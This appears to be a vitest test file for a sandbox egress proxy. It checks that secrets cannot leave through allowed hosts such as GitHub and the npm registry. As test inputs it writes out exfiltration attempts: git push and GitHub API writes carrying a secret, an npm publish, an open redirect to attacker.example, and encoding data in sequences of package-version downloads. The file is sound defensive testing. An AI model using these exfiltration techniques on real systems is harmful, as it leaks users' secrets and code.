import { beforeAll, describe, expect, it } from 'vitest';
import { READ_CAPS } from '../../src/network/reads.js';
import { egressRunnable, useEgress } from './egress.js';
import { cli, ensureImage } from './helpers.js';

/**
 * Isolation n° 6: abuse of an allowed domain (ORC-219, against ORC-213). GitHub and the npm registry are on the `limited`
 * list, for reads: a `git push` to another repository, a gist, an `npm publish`, any write of the GitHub API, a redirect
 * out of the list are refused, and nothing of them reaches the stand-in internet. Each refusal has its control, a read
 * by the same tool that does reach it. The image has git (the slim one the suite defaults to has none).
 */
const IMAGE = process.env['FACTORY_RUNNER_IMAGE'] ?? 'docker.io/library/node:24.22.1-bookworm';
const SECRET = 'c2VjcmV0LWNvZGUtb2YtdGhlLXJlcG8';

describe.skipIf(!egressRunnable)(`isolation 6: abuse of an allowed domain (${cli})`, () => {
  const egress = useEgress('iso6', {
    image: IMAGE,
    // An open redirect on an allowed host, to the attacker's, the secret in the URL.
    answer: (req, res) => {
      if (req.url !== '/redirect-me') return false;
      res.writeHead(302, { location: `https://attacker.example/${SECRET}` }).end();
      return true;
    },
  });
  let box: Awaited<ReturnType<typeof egress.open>>;
  const writes = () => egress.seen.filter((s) => !['GET', 'HEAD', 'OPTIONS'].includes(s.method) || s.url.includes('receive-pack'));

  beforeAll(async () => {
    ensureImage(IMAGE);
    box = await egress.open('limited');
  }, 600_000);

  it('git push to another repository is refused, by the smart protocol or a direct POST; git fetch goes through', async () => {
    const auth = `-c http.extraHeader="Authorization: Basic eC1hY2Nlc3MtdG9rZW46c3RvbGVu"`;
    const push = `cd $(mktemp -d) && git init -q && echo ${SECRET} > leak && git add leak && git -c user.email=a@b -c user.name=a commit -qm x && git ${auth} push https://github.com/someone-else/elsewhere HEAD:refs/heads/leak`;
    expect((await box.sh(push)).code).not.toBe(0);
    for (const path of ['/someone-else/elsewhere.git/git-receive-pack', '/someone-else/elsewhere/git-receive-pack?service=git-upload-pack']) {
      expect(await box.probe('fetch', `https://github.com${path}`, 'POST', SECRET), path).toMatch(/^403 /);
    }
    expect(await box.journal()).toContainEqual(expect.objectContaining({ host: 'github.com', path: '/someone-else/elsewhere/info/refs', ok: false, reason: expect.stringMatching(/git push refused/) as string }));
    expect(writes()).toEqual([]);
    // The control: git reads through the proxy, up to the stand-in (which is no git server: the command itself fails).
    await box.sh('git ls-remote https://github.com/octocat/Hello-World');
    expect(egress.seen).toContainEqual(expect.objectContaining({ host: 'github.com', method: 'GET', url: '/octocat/Hello-World/info/refs?service=git-upload-pack' }));
  });

  it('a gist, and any other write of the GitHub API, is refused; a read goes through', async () => {
    const writesOf = [
      ['POST', '/gists'],
      ['POST', '/graphql'],
      ['PUT', '/repos/someone-else/elsewhere/contents/leak'],
      ['POST', '/repos/someone-else/elsewhere/issues'],
      ['PATCH', '/repos/someone-else/elsewhere'],
      ['DELETE', '/repos/someone-else/elsewhere'],
    ];
    for (const [method, path] of writesOf) expect(await box.probe('fetch', `https://api.github.com${path}`, method!, JSON.stringify({ files: { leak: { content: SECRET } } })), `${method} ${path}`).toMatch(/^403 /);
    expect(writes()).toEqual([]);
    expect(await box.probe('fetch', 'https://api.github.com/repos/octocat/Hello-World')).toMatch(/^200 /);
  });

  it('npm publish is refused, with a token of its own; npm view goes through', async () => {
    const pkg = JSON.stringify({ name: 'factory-iso6-leak', version: '1.0.0', description: SECRET });
    const publish = `cd $(mktemp -d) && echo '${pkg}' > package.json && echo '//registry.npmjs.org/:_authToken=npm-token-of-its-own' > .npmrc && HOME=$(mktemp -d) npm publish --registry https://registry.npmjs.org/`;
    expect((await box.sh(publish)).code).not.toBe(0);
    expect(await box.journal()).toContainEqual(expect.objectContaining({ method: 'PUT', host: 'registry.npmjs.org', path: '/factory-iso6-leak', ok: false }));
    expect(writes()).toEqual([]);
    // The control: npm reads the registry through the proxy (the stand-in's answer is no package: npm fails on it).
    await box.sh('HOME=$(mktemp -d) npm view factory-iso6-leak version');
    expect(egress.seen).toContainEqual(expect.objectContaining({ host: 'registry.npmjs.org', method: 'GET', url: '/factory-iso6-leak' }));
  });

  it('a redirect off the list, the secret in its URL, is not followed out', async () => {
    expect(await box.probe('fetch', 'https://github.com/redirect-me')).toMatch(/^ERR /);
    expect(egress.seen).toContainEqual(expect.objectContaining({ host: 'github.com', url: '/redirect-me' }));
    expect(egress.seen.filter((s) => s.host.includes('attacker') || s.url.includes(SECRET))).toEqual([]);
    expect(await box.journal()).toContainEqual(expect.objectContaining({ method: 'CONNECT', host: 'attacker.example', ok: false }));
  });

  it('a read carrying code in its path goes out, as any read of a listed host, and its journal line keeps the path', async () => {
    expect(await box.probe('fetch', `https://github.com/someone-else/elsewhere/blob/main/${SECRET}`)).toMatch(/^200 /);
    expect(await box.journal()).toContainEqual(expect.objectContaining({ method: 'GET', host: 'github.com', path: `/someone-else/elsewhere/blob/main/${SECRET}`, ok: true }));
  });

  // ORC-370: a read can carry code out to a counter the attacker reads (an npm version's downloads, a release asset's
  // `download_count`, public through the API) by which versions or assets it reads. The proxy counts them per run: past
  // the cap, refused before the stand-in internet sees them, journaled as suspicious with the package and version or the
  // asset, never the query. A version read again is no new symbol: it goes.
  it('a sequence of versions or release assets spelling out code is cut at the cap, journaled as suspicious, its query left out', async () => {
    const tarball = (i: number) => `https://registry.npmjs.org/left-pad/-/left-pad-1.0.${i}.tgz?bits=${SECRET}`;
    const asset = (i: number) => `https://github.com/someone-else/elsewhere/releases/download/v${i}/bit.bin`;
    for (let i = 0; i < READ_CAPS.versionsPerPackage; i++) expect(await box.probe('fetch', tarball(i)), `version ${i}`).toMatch(/^200 /);
    expect(await box.probe('fetch', tarball(READ_CAPS.versionsPerPackage))).toMatch(/^403 /);
    expect(await box.probe('fetch', tarball(0))).toMatch(/^200 /);
    for (let i = 0; i < READ_CAPS.assetsPerRepo; i++) expect(await box.probe('fetch', asset(i)), `asset ${i}`).toMatch(/^200 /);
    expect(await box.probe('fetch', asset(READ_CAPS.assetsPerRepo))).toMatch(/^403 /);

    const past = `/left-pad/-/left-pad-1.0.${READ_CAPS.versionsPerPackage}.tgz`;
    expect(egress.seen.filter((s) => s.url.startsWith(past) || s.url.includes(`/v${READ_CAPS.assetsPerRepo}/bit.bin`))).toEqual([]);
    const journal = await box.journal();
    expect(journal).toContainEqual(expect.objectContaining({ host: 'registry.npmjs.org', path: past, ok: false, suspicious: true, read: { kind: 'npm', name: 'left-pad', item: `1.0.${READ_CAPS.versionsPerPackage}` } }));
    expect(journal).toContainEqual(expect.objectContaining({ host: 'github.com', ok: false, suspicious: true, read: { kind: 'release', name: 'someone-else/elsewhere', item: `v${READ_CAPS.assetsPerRepo}/bit.bin` } }));
    expect(journal).toContainEqual(expect.objectContaining({ host: 'registry.npmjs.org', ok: true, read: { kind: 'npm', name: 'left-pad', item: '1.0.0' } }));
    // The query never reaches the journal: the counters do not see it, and it can carry a token.
    expect(JSON.stringify(journal)).not.toContain(`bits=${SECRET}`);
  });
});
